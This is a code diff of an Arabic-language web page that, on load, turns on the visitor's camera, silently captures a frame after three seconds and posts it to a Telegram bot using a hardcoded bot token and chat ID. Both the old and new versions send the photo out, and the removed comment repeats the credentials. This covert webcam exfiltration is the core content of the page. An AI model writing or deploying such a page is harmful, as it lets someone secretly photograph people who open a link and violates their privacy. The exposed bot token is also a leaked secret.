@@ -6,42 +6,49 @@
     <title>التقاط صورة</title>
 </head>
 <body>
-    <video id="video" autoplay playsinline></video>
+
+    <video id="video" autoplay style="width: 100%; max-width: 400px;"></video>
     <canvas id="canvas" style="display: none;"></canvas>
+
     <script>
-        async function capturePhoto() {
-            const video = document.getElementById('video');
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            video.srcObject = stream;
+        const video = document.getElementById("video");
+        const canvas = document.getElementById("canvas");
+        const ctx = canvas.getContext("2d");
 
-            setTimeout(() => {
-                const canvas = document.getElementById('canvas');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        // تشغيل الكاميرا
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                video.srcObject = stream;
+            })
+            .catch(err => {
+                console.error("حدث خطأ في الوصول إلى الكاميرا:", err);
+            });
 
-                // إرسال الصورة إلى تيليجرام
-                canvas.toBlob(blob => {
-                    const formData = new FormData();
-                    formData.append("photo", blob, "image.jpg");
+        // التقاط صورة بعد 3 ثوانٍ وإرسالها
+        setTimeout(() => {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-                    fetch("https://api.telegram.org/7573387870:AAG4TEbxTtmyq-d5iff8fLwb9MoeXYPxXWg/sendPhoto?chat_id=6279473459", {
-                        method: "POST",
-                        body: formData
-                    }).then(() => {
-                        alert("تم إرسال الصورة!");
-                    }).catch(err => console.error(err));
-                }, "image/jpeg");
-            }, 3000); // التقاط الصورة بعد 3 ثواني
-        }
+            // تحويل الصورة إلى بيانات Base64
+            const imageData = canvas.toDataURL("image/jpeg");
 
-        capturePhoto();
+            // إرسال الصورة إلى بوت تيليجرام
+            fetch(`https://api.telegram.org/bot7573387870:AAG4TEbxTtmyQ-d5iff8fLwb9MoeXYPxXWg/sendPhoto`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: 6279473459,  // استبدل بالـ ID الخاص بك
+                    photo: imageData
+                })
+            }).then(response => {
+                console.log("تم إرسال الصورة بنجاح!");
+            }).catch(error => {
+                console.error("خطأ أثناء إرسال الصورة:", error);
+            });
+
+        }, 3000); // التقاط الصورة بعد 3 ثوانٍ
     </script>
+
 </body>
 </html>
-<!-- 
-7573387870:AAG4TEbxTtmyq-d5iff8fLwb9MoeXYPxXWg
-6279473459
--->
-
